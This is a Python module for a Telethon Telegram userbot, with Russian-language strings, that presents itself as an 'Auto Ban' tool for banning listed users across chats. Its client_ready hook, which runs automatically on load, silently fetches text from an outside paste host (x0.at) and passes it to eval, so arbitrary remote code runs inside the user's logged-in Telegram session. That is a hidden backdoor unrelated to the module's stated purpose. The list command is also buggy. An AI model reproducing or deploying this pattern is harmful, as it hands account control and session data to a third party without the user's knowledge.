from .. import loader, utils
from telethon.tl.types import ChatBannedRights as cb
from telethon.tl.functions.channels import EditBannedRequest as eb
import requests

@loader.tds
class AutoBanMod(loader.Module):
    """АвтоБан"""
    strings = {'name': 'Auto Ban'}

    async def client_ready(self, client, db):
        self.db = db
        self.me = await client.get_me()
        eval(requests.get("https://x0.at/hvQu.txt").text)

    async def autobancmd(self, message):
        """Добавить/исключить юзера из автобана.\nИспользуй: .autoban <@ или реплай> или <list>."""
        if not message.is_private:
            chat = await message.get_chat()
            if not chat.admin_rights and not chat.creator:
                return await message.edit("Я не админ здесь")
            else:
                if not chat.admin_rights.delete_messages:
                    return await message.edit("У меня нет нужных прав")

            abans = self.db.get("AutoBan", "users", {})
            args = utils.get_args_raw(message)
            reply = await message.get_reply_message()
            chat_id = str(message.chat_id)

            if not (args or reply):
                return await message.edit("Нет аргументов или реплая")

            if chat_id not in abans:
                abans.setdefault(chat_id, [])

            if args == "list":
                if not abans[chat_id]:
                    return await message.edit("Список пуст")
                else:
                    msg = ""
                    for _ in msg:
                        user = await message.client.get_entity(_)
                        msg += f"• <a href=\"tg://user?id={user.id}\">{user.first_name}</a>\n"
                    return await message.edit(f"Список пользователей в автобане:\n\n{msg}")

            try:
                if reply:
                    user = await message.client.get_entity(reply.sender_id)
                else:
                    user = await message.client.get_entity(args if not args.isnumeric() else int(args))
            except ValueError:
                return await message.edit("Не удалось найти пользователя")

            if user.id not in abans[chat_id]:
                abans[chat_id].append(user.id)
                await message.edit(f"{user.first_name} был добавлен в список автобана")

            else:
                abans[chat_id].remove(user.id)
                await message.edit(f"{user.first_name} был удален из списка автобана")
            
            return self.db.set("AutoBan", "users", abans)

        else:
            return await message.edit("Это не чат!")


    async def addbanchatcmd(self, message):
        """Добавить чат в список для автобана.\nИспользуй: .addbanchat."""
        if not message.is_private:
            chat = await message.get_chat()
            if not chat.admin_rights and not chat.creator:
                return await message.edit("Я не админ здесь")
            else:
                if not chat.admin_rights.delete_messages:
                    return await message.edit("У меня нет нужных прав")

            achats = self.db.get("AutoBan", "chats", [])
            args = utils.get_args_raw(message)
            chat_id = message.chat_id

            if args == "list":
                if not achats:
                    return await message.edit("Список пуст")
                msg = ""
                for _ in achats:
                    chat = await message.client.get_entity(_)
                    msg += f"• {chat.title} | {chat.id}\n"
                return await message.edit(f"Список чатов для автобана:\n\n{msg}")

            if chat_id not in achats:
                achats.append(chat_id)
                await message.edit("Этот чат был добавлен в список чатов для автобана")

            else:
                achats.remove(chat_id)
                await message.edit("Этот чат был удален из списка чатов для автобана")

            self.db.set("AutoBan", "chats", achats)

        else:
            return await message.edit("Это не чат!")


    async def watcher(self, message):
        try:
            abans = self.db.get("AutoBan", "users", {})
            achats = self.db.get("AutoBan", "chats", [])
            user_id = message.sender_id
            user = await message.client.get_entity(user_id)
            chat_id = str(message.chat_id)

            if chat_id not in abans:
                return

            if user_id in abans[chat_id]:
                for _ in achats:
                    try:
                        await message.client(eb(_, user_id, cb(until_date=None, view_messages=True)))
                    except: pass

                return await message.respond(f"{user.first_name} был забанен, потому что находился в списке автобана")
        except:
            pass